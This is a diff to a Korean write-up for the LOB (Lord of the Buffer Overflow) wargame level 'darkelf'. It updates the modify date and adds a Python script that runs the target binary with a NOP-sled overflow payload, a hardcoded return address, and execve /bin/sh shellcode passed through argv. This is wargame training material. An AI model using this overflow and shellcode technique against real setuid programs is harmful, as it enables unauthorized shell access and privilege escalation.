@@ -3,7 +3,7 @@ title: "[LOB]Level06. darkelf"
 tags: [LOB, writeup]
 author: eli_ez3r
 key: 20180829
-modify_date: 2018-08-29
+modify_date: 2019-11-13
 article_header:
   type: cover
   image:
@@ -98,3 +98,30 @@ argv[2]의 주소는 0xbffffbde로 확인되었다.
 
 -----
 
+```python
+import os
+import struct
+
+append = lambda x, y: x + y
+p32 = lambda x: struct.pack("<I", x)
+
+target = "/home/wolfman/darkelf"
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+shellcode_addr = 0xbffffbde
+
+payload1 = "\x90"*44
+payload1 = append(payload1, p32(shellcode_addr))
+
+payload2 = "\x90"*50
+payload2 = append(payload2, shellcode)
+
+pid = os.fork()
+
+if pid == 0:
+        os.execv(target, (target, payload1, payload2))
+else:
+        os.waitpid(pid, 0)
+```
+
+-----
